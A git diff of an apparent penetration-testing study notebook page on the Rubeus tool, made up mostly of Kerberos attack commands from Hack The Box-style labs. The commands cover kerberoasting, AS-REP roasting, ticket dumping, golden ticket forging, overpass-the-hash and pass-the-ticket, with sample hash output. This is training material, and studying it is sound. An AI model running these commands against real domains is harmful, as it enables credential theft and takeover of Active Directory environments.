@@ -9,6 +9,91 @@ hideFooterPagination: true
 
 {/* Generated from Commands/rubeus.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Rubeus.exe: choose the operation and read the result
+
+Inspect and use the saved Kerberos ticket commands.
+
+### What the result establishes
+
+Identify whether you are inspecting tickets, requesting a ticket, importing one or exercising a delegation path.
+
+### Prerequisites and common failures
+
+A ticket's principal, service, realm, lifetime and logon-session placement matter; possessing a ticket does not grant rights absent from its identity.
+
+### Example 1: Commands
+
+Run in: **Windows PowerShell**. Kerberoasting requests tickets; use the authorized lab scope.
+
+```powershell
+.\Rubeus.exe klist
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt
+```
+
+### Example 2: Rubeus — Find a Kerberos Task
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe
+```
+
+Saved context: [Rubeus — Find a Kerberos Task — Rubeus — Find a Kerberos Task](/tools/rubeus). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Rubeus — dump tickets (base64)
+
+Run in: **Saved lab example**.
+
+```cmd
+Rubeus.exe dump /nowrap
+```
+
+Saved context: [Pass the Ticket from Windows — Rubeus — dump tickets (base64)](/password-attacks/pass-the-ticket-from-windows#rubeus-—-dump-tickets-base64). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Show Kerberoastable Account Statistics
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+Saved context: [Kerberoasting from Windows — Show Kerberoastable Account Statistics](/active-directory/kerberoasting-windows#show-kerberoastable-account-statistics). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Write Results to a File
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+Saved context: [Kerberoasting from Windows — Write Results to a File](/active-directory/kerberoasting-windows#write-results-to-a-file). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Target One User
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+Saved context: [Kerberoasting from Windows — Target One User](/active-directory/kerberoasting-windows#target-one-user). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Limit Results with an LDAP Filter
+
+Run in: **Saved lab example**.
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+Saved context: [Kerberoasting from Windows — Limit Results with an LDAP Filter](/active-directory/kerberoasting-windows#limit-results-with-an-ldap-filter). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Inspect and use the saved Kerberos ticket commands.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=rubeus) · [All tools](/index)
@@ -21,6 +106,13 @@ Replace UPPER_CASE values with your lab values.
 .\Rubeus.exe klist
 .\Rubeus.exe kerberoast /outfile:kerberoast.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Rubeus — Find a Kerberos Task — Example 1: Commands](/tools/rubeus#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Kerberoasting requests tickets; use the authorized lab scope.
 
@@ -70,6 +162,13 @@ PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
 [*] Supported ETypes       : RC4_HMAC_DEFAULT
 [*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Kerberoasting with Rubeus](/active-directory/acl-abuse-lab#kerberoasting-with-rubeus)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -149,6 +248,13 @@ PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LO
 [+] Ticket successfully imported!
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Creating a Golden Ticket using Rubeus](/active-directory/trusts-child-parent-windows#creating-a-golden-ticket-using-rubeus)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Performing a Kerberoasting Attacking with Rubeus Using /domain Flag">
@@ -188,6 +294,13 @@ PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc
 [*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Forest Trusts - Windows — Performing a Kerberoasting Attacking with Rubeus Using /domain Flag](/active-directory/trusts-cross-forest-windows#performing-a-kerberoasting-attacking-with-rubeus-using-/domain-flag)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Limit Results with an LDAP Filter">
@@ -199,6 +312,13 @@ PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc
 ```powershell
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Limit Results with an LDAP Filter](/active-directory/kerberoasting-windows#limit-results-with-an-ldap-filter) · [Rubeus — Find a Kerberos Task — Example 7: Limit Results with an LDAP Filter](/tools/rubeus#example-7-limit-results-with-an-ldap-filter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -223,6 +343,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 .\Rubeus.exe kerberoast /user:<USER> /nowrap
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Quick Reference](/active-directory/kerberoasting-windows#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Show Kerberoastable Account Statistics">
@@ -234,6 +361,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 ```powershell
 .\Rubeus.exe kerberoast /stats
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Show Kerberoastable Account Statistics](/active-directory/kerberoasting-windows#show-kerberoastable-account-statistics) · [Rubeus — Find a Kerberos Task — Example 4: Show Kerberoastable Account Statistics](/tools/rubeus#example-4-show-kerberoastable-account-statistics)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -247,6 +381,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 .\Rubeus.exe kerberoast /user:testspn /nowrap
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Target One User](/active-directory/kerberoasting-windows#target-one-user) · [Rubeus — Find a Kerberos Task — Example 6: Target One User](/tools/rubeus#example-6-target-one-user)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Write Results to a File">
@@ -258,6 +399,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 ```powershell
 .\Rubeus.exe kerberoast /outfile:hashes.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Write Results to a File](/active-directory/kerberoasting-windows#write-results-to-a-file) · [Rubeus — Find a Kerberos Task — Example 5: Write Results to a File](/tools/rubeus#example-5-write-results-to-a-file)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -272,6 +420,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 Rubeus.exe kerberoast /outfile:kerb.hash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting: Quick Reference — Existing notes and worked examples](/active-directory/kerberoasting#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Unconstrained">
@@ -284,6 +439,13 @@ Rubeus.exe kerberoast /outfile:kerb.hash
 Rubeus.exe monitor /interval:5
 # then coerce: PrinterBug / PetitPotam against the DC
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Delegation: Quick Reference — Unconstrained](/active-directory/delegation#unconstrained)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -320,6 +482,13 @@ PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
      $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Miscellaneous Misconfigurations — Retrieving AS-REP in Proper Format using Rubeus](/active-directory/miscellaneous-misconfigurations#retrieving-as-rep-in-proper-format-using-rubeus)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Rubeus — dump tickets (base64)">
@@ -331,6 +500,13 @@ PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 ```cmd
 Rubeus.exe dump /nowrap
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Rubeus — dump tickets (base64)](/password-attacks/pass-the-ticket-from-windows#rubeus-—-dump-tickets-base64) · [Rubeus — Find a Kerberos Task — Example 3: Rubeus — dump tickets (base64)](/tools/rubeus#example-3-rubeus-—-dump-tickets-base64)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -344,11 +520,25 @@ Rubeus.exe dump /nowrap
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:julio /aes256:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76 /nowrap
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)](/password-attacks/pass-the-ticket-from-windows#step-2a-—-overpass-the-hash-/-pass-the-key-forge-a-tgt-from-a-key)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Windows**
 
 ```cmd
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /ptt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2a — OverPass-the-Hash / Pass the Key (forge a TGT from a key)](/password-attacks/pass-the-ticket-from-windows#step-2a-—-overpass-the-hash-/-pass-the-key-forge-a-tgt-from-a-key)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -363,6 +553,13 @@ Rubeus.exe ptt /ticket:doIFujCCBba...        # base64 from asktgt/dump
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   # a .kirbi file
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2b — Inject a stolen/forged ticket (the actual "pass")](/password-attacks/pass-the-ticket-from-windows#step-2b-—-inject-a-stolen/forged-ticket-the-actual-pass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Rubeus — Find a Kerberos Task">
@@ -375,6 +572,13 @@ Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   #
 .\Rubeus.exe
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Rubeus — Find a Kerberos Task — Example 2: Rubeus — Find a Kerberos Task](/tools/rubeus#example-2-rubeus-—-find-a-kerberos-task) · [Rubeus — Find a Kerberos Task — Existing notes and worked examples](/tools/rubeus#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Rubeus — Find a Kerberos Task**
 
 Context from the notebook: Run on:  a Windows lab host, from PowerShell or Command Prompt, in the directory containing  Rubeus.exe .
@@ -382,6 +586,13 @@ Context from the notebook: Run on:  a Windows lab host, from PowerShell or Comma
 ```text
 Rubeus.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Rubeus — Find a Kerberos Task — Existing notes and worked examples](/tools/rubeus#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -397,6 +608,13 @@ Context from the notebook: OverPass-the-Hash / Pass the Key  bridges hash→Kerb
 Rubeus asktgt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Key Takeaways](/password-attacks/pass-the-ticket-from-windows#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Windows**
 
 Context from the notebook: Dump with  sekurlsa::tickets /export ,  sekurlsa::ekeys , or  Rubeus dump /nowrap ; inject with  Rubeus ptt  /  kerberos::ptt ; verify with  klist .
@@ -405,6 +623,13 @@ Context from the notebook: Dump with  sekurlsa::tickets /export ,  sekurlsa::eke
 Rubeus dump /nowrap
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Key Takeaways](/password-attacks/pass-the-ticket-from-windows#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Windows**
 
 Context from the notebook: Dump with  sekurlsa::tickets /export ,  sekurlsa::ekeys , or  Rubeus dump /nowrap ; inject with  Rubeus ptt  /  kerberos::ptt ; verify with  klist .
@@ -412,6 +637,13 @@ Context from the notebook: Dump with  sekurlsa::tickets /export ,  sekurlsa::eke
 ```text
 Rubeus ptt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Key Takeaways](/password-attacks/pass-the-ticket-from-windows#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -427,6 +659,13 @@ Context from the notebook: PtT is core  lateral movement  in an AD engagement. T
 Rubeus dump
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Where it fits in a pentest](/password-attacks/pass-the-ticket-from-windows#where-it-fits-in-a-pentest)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Common problems">
@@ -441,6 +680,13 @@ Context from the notebook: Executable not found:  check  Get-Location  and  Test
 Get-Location
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Common problems](/tools/powerview#common-problems) · [Rubeus — Find a Kerberos Task — Common problems](/tools/rubeus#common-problems)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Rubeus — Find a Kerberos Task**
 
 Context from the notebook: Executable not found:  check  Get-Location  and  Test-Path .\Rubeus.exe .
@@ -448,6 +694,13 @@ Context from the notebook: Executable not found:  check  Get-Location  and  Test
 ```text
 Test-Path .\Rubeus.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Rubeus — Find a Kerberos Task — Common problems](/tools/rubeus#common-problems)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -518,6 +771,21 @@ PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC
   ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Requesting TGT and Performing PTT with DC01$ Machine Account](/active-directory/historical-vulnerability-labs#requesting-tgt-and-performing-ptt-with-dc01$-machine-account)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Rubeus — Find a Kerberos Task](/tools/rubeus)
+
+{/* VAULT_RELATED_END */}
